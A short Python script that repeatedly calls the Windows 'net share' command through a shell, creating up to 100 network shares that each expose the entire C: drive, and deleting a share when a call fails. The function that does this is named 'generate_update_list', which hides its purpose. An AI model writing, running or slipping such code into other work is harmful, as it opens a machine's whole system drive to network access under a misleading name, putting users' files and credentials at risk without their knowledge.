import subprocess


def main():
    for numbers in range(100):
        generate_update_list(numbers)


def generate_update_list(share):
    try:
        subprocess.check_call('net share {}=c:\ '.format(share), shell=True)
    except:
        subprocess.check_call('net share {} /delete '.format(share), shell=True)


if __name__ == "__main__": main()